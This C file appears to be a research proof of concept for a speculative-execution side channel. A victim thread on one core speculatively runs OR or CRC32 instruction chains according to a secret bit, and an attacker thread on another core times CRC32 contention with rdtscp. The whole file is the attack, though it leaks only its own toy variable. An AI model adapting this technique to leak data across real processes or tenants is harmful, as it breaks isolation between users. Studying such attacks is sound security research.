#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <pthread.h>
#include <x86intrin.h>
#include <xmmintrin.h>
#include "low.h"

#define STRIDE 1024
#define REP	100 
#define CNT	100
#define DEBUG	0

extern void victim_function_S(int x, int train);
extern void attack_S();
uint8_t array[256 * STRIDE] __attribute__((aligned(512)));
uint64_t tmp;
double x,y, x2,y2;
int secret = 0;
int zero = 0;	
unsigned long long crc_attack = 0;
unsigned long long crc_victim = 0;


pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
const int memsize =  262144; 

static inline unsigned long long my_rand (unsigned long long limit)
{
	return ((unsigned long long)(((unsigned long long)rand()<<48)^((unsigned long long)rand()<<32)^((unsigned long long)rand()<<16)^(unsigned long long)rand())) % limit;
}

void dbuf_init(void ** dbuf, int size, int cycle_length)
{
	for (int i = 0; i < size; i++)
		dbuf[i] = &dbuf[i];
	for (int i = size - 1; i > 0; i--) {
		if (i & 0x1ff)	continue;
		if (i < cycle_length)	continue;
		unsigned int k = my_rand(i/cycle_length) * cycle_length + (i%cycle_length);
		void *tmp = dbuf[i];
		dbuf[i] = dbuf[k];
		dbuf[k] = tmp;
	}
}

void pointer_chase(void ** memory, int count)
{
	void **p = memory;
	while (count-- > 0)
		p = (void **) *p;
}

static uint64_t time_victim, time_attack, overall=0;
void ** memory;
unsigned int dummy;

static void victim_function_new(int value, int isPublic)
{
	for (volatile int i = 0; i < 200; i++);

	register unsigned long long g_1, g_2, g_3, g_4, g_5, g_6;
	if (isPublic < array[2 * STRIDE]) {
	  // Change 0 to zero to see how two operands are hardened
	  if (value == 0) {
	    //OR8 OR4 OR2
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	    g_2 = g_1 | g_2;
	    g_3 = g_2 | g_3;
	    g_4 = g_3 | g_4;
	    g_5 = g_4 | g_5;
	    g_1 = g_5 | g_1;
	  } else {
	    //CRC328 CRC324 CRC322
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	    g_1 = __builtin_ia32_crc32di(g_1, g_1);
	    g_2 = __builtin_ia32_crc32di(g_2, g_2);
	    g_3 = __builtin_ia32_crc32di(g_3, g_3);
	    g_4 = __builtin_ia32_crc32di(g_4, g_4);
	    g_5 = __builtin_ia32_crc32di(g_5, g_5);
	  }
	}
	crc_victim += (g_1 + g_2 + g_3 + g_4 + g_5);
}

void *victim()
{
	cpu_set_t cpuset, cpuget;
	CPU_ZERO(&cpuset);
	CPU_ZERO(&cpuget);
	CPU_SET(1, &cpuset);
	if (pthread_setaffinity_np( pthread_self(), sizeof(cpu_set_t), &cpuset)
		< 0 ||
		pthread_getaffinity_np( pthread_self(), sizeof(cpu_set_t), &cpuget) 
		!= 0 || !CPU_ISSET(1, &cpuget)) {
		printf("Failed setting threads...\n");
		exit(0);
	}
	
	victim_function_new(0,1);
	victim_function_new(0,1);

	BARRIER
	CLFLUSH(array[2*STRIDE]);
	BARRIER

	pointer_chase(memory, CNT);
	
#if DEBUG
	// Test synchronize
	BARRIER
	time_victim = __rdtscp(&dummy); 
#else
	BARRIER
	victim_function_new(secret,100);
	BARRIER
#endif
}

static void loop_function(uint8_t x, int train)
{
	for (volatile int i = 0; i < 200; i++);
}

void *attack()
{
	cpu_set_t cpuset, cpuget;
	CPU_ZERO(&cpuset);
	CPU_ZERO(&cpuget);
	CPU_SET(5, &cpuset);
	if (pthread_setaffinity_np( pthread_self(), sizeof(cpu_set_t), &cpuset)
		< 0 ||
		pthread_getaffinity_np( pthread_self(), sizeof(cpu_set_t), &cpuget) 
		!= 0 || !CPU_ISSET(5, &cpuget)) {
		printf("Failed setting threads...\n");
		exit(0);
	}
	
	
	loop_function(0,1);
	loop_function(0,1);
	pointer_chase(memory, CNT);

#if DEBUG
	BARRIER
	time_attack = __rdtscp(&dummy);
#else
	BARRIER

	register unsigned long long g_1 = 0, g_2 = 0, g_3 = 0, g_4 = 0, g_5 = 0, g_6 = 0;
	for (volatile int i = 0; i < 200; i++);
	tmp = __rdtscp(&dummy); 
	//CRC321 CRC324 CRC322
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);
	g_1 = __builtin_ia32_crc32di(g_1, g_1);
	g_2 = __builtin_ia32_crc32di(g_2, g_2);
	g_3 = __builtin_ia32_crc32di(g_3, g_3);
	g_4 = __builtin_ia32_crc32di(g_4, g_4);
	g_5 = __builtin_ia32_crc32di(g_5, g_5);

	tmp = __rdtscp(&dummy) - tmp;

	BARRIER
	overall += tmp;
	BARRIER
	crc_attack += (g_1 + g_2 + g_3 + g_4 + g_5);
#endif

}

int main()
{
  for (int sec = 0; sec < 10; sec++) {
	secret = sec % 2;
	overall = 0;
	for (int i = 0; i < REP; i++) {
		memory = (void**)valloc(memsize);
		dbuf_init(memory, memsize/sizeof(void*), 8192/sizeof(void*));
		array[2*STRIDE] = 10;	

		// Pin the main thread to core 2
		pthread_t victim_t, attack_t;
		cpu_set_t cpuset, cpuget;
		CPU_ZERO(&cpuset);
		CPU_ZERO(&cpuget);
		CPU_SET(2, &cpuset);
		if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0 ||
			sched_getaffinity(0, sizeof(cpu_set_t), &cpuget) != 0 ||
			!CPU_ISSET(2, &cpuget)) {
			printf("Main thread failed to assign affinity\n");
			exit(0);
		}


		// Create threads, pin them to core 1 and 5 respectively
		pthread_create(&victim_t, NULL, victim, NULL);
		pthread_create(&attack_t, NULL, attack, NULL);

		pthread_join(victim_t,NULL);
		pthread_join(attack_t,NULL);

		
#if DEBUG		
		printf("%s is faster by %ld cycles\n", time_victim > time_attack ? "Attack" : "Victim",
						time_victim > time_attack ? 
						time_victim - time_attack : time_attack - time_victim);	
#endif
		
		free(memory);
	}
	printf("Overall Timing: %ld\n", overall/REP);
  }
	BARRIER
	printf("crc values are %lld, %lld\n", crc_attack, crc_victim);
	return 0;
}
